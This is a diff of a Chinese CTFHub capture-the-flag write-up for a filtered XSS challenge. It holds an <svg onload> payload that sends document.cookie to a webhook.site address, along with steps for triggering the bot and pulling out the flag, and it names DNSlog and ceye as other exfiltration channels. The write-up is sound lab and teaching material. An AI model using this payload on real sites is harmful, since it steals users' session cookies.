@@ -17,26 +17,28 @@ tags: CTFHub Web
  
 ## 解题步骤
 1. 漏洞验证
-输入测试payload：<script>alert(1)</script>
+输入测试payload：
+```<script>alert(1)</script>```
 后端删除 <script 关键字，标签被破坏，无法执行JS，确认关键词过滤。
 
-2. 构造Payload
-测试弹窗payload：<svg onload=alert(1)>
+3. 构造Payload
+测试弹窗payload：
+```<svg onload=alert(1)>```
 最终可用Payload
-<svg onload="new Image().src='https://webhook.site/53595844-8e14-4c3f-89b4-bffe6625e4e2?c='+document.cookie">
+```<svg onload="new Image().src='https://webhook.site/53595844-8e14-4c3f-89b4-bffe6625e4e2?c='+document.cookie">```
 踩坑：img+onerror payload在本题Bot环境触发不稳定，svg方案成功拿到flag。
  
-3. 提交Payload，发送Bot
+5. 提交Payload，发送Bot
 将Payload粘贴到靶场输入框提交，复制浏览器完整URL，粘贴至 Send URL to Bot 发送。
 
-4. 获取Flag
+6. 获取Flag
 刷新webhook.site，等待Bot请求，查看 Query strings 参数，提取flag：
 ctfhub{cfce16e330902cfe52dc54e8}
 
 ## 踩坑指南
 1.  禁止使用 <script> 相关标签，关键词会被后端直接删除，payload失效。
-2.  < img src=x onerror=...> 需要图片加载失败才触发事件，在部分Bot环境渲染异常，事件不触发，无法外带数据。
-3.  <svg onload> 标签渲染完成就执行JS，不需要加载外部资源，Bot场景稳定性更强，优先作为备选。
+2.  `< img src=x onerror=...>` 需要图片加载失败才触发事件，在部分Bot环境渲染异常，事件不触发，无法外带数据。
+3.  `<svg onload> `标签渲染完成就执行JS，不需要加载外部资源，Bot场景稳定性更强，优先作为备选。
 4.  webhook.site为境外站点，Bot可能访问超时，可以备用DNSlog、ceye。
 5.  注意引号匹配，onload内部单引号和外层双引号错开，防止JS提前闭合。
  
